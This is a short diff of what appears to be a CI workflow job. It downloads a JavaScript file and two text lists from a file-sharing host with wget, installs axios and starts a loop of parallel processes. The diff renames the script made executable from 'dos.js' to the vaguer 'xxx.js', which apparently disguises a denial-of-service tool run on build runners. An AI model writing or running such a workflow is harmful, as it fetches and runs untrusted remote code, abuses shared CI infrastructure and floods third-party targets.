@@ -18,7 +18,7 @@ jobs:
           wget https://curl.by/AoQhf/xxx.js
           wget https://curl.by/19kka/fres.txt
           wget https://curl.by/T-Ake/uas.txt
-          chmod +x dos.js
+          chmod +x xxx.js
           npm i axios 
           PIDS=()
           for i in {1..4}; do
